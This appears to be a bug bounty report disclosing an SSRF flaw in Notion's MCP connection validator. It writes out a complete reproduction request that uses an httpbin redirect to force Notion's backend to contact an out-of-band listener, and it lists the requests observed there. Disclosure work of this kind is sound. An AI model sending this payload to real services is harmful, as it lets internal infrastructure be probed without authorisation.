Title: SSRF via Redirect Following in Notion's MCP Connection Validator

Severity: High (or Medium if triager disagrees on impact)
Asset: Product API (notion.so/api/v3)

Summary:
The POST /api/v3/validateMcpConnection endpoint accepts a user-supplied serverUrl. During validation, Notion's backend (Notion-MCP-Client/1.0) blindly follows HTTP redirects. An authenticated user can supply a URL that redirects to an arbitrary destination, causing Notion's infrastructure to make requests and initiate an MCP handshake with the target. This allows an attacker to bypass URL validation and force Notion's servers to interact with internal or external endpoints.

Steps To Reproduce:

    Set up an Out-of-Band (OAST) listener (e.g., bqvvkrfxzdnmfqslrpxpj67t0u2a2yzmw.oast.fun).

    Send the following request to configure an MCP connection with a redirecting URL (e.g., using httpbin.org as a redirector):

http

POST /api/v3/validateMcpConnection HTTP/1.1
Host: www.notion.so
Cookie: token_v2=<YOUR_VALID_TOKEN>
x-notion-active-user-header: <YOUR_USER_ID>
Content-Type: application/json

{
  "serverUrl": "https://httpbin.org/redirect-to?url=http://<YOUR_OAST_HOST>/mcp",
  "spaceId": "<YOUR_SPACE_ID>",
  "authHeaders": [],
  "initiationContext": "connect"
}

    Observe your OAST listener. Notion's backend follows the redirect and sends multiple requests to the OAST host:

        GET /.well-known/openid-configuration

        HEAD /mcp

        POST /mcp (JSON-RPC handshake)

        GET /mcp (SSE stream)

Impact:
An attacker with a Business/Enterprise workspace can force Notion's backend to send requests to arbitrary endpoints, including internal services, by using an HTTP redirect to bypass initial URL validation. While this report demonstrates the redirect behavior using an external OAST listener, the same mechanism could be used to interact with internal infrastructure.

Supporting Material/References:

    OAST logs showing the redirect following and MCP handshake.
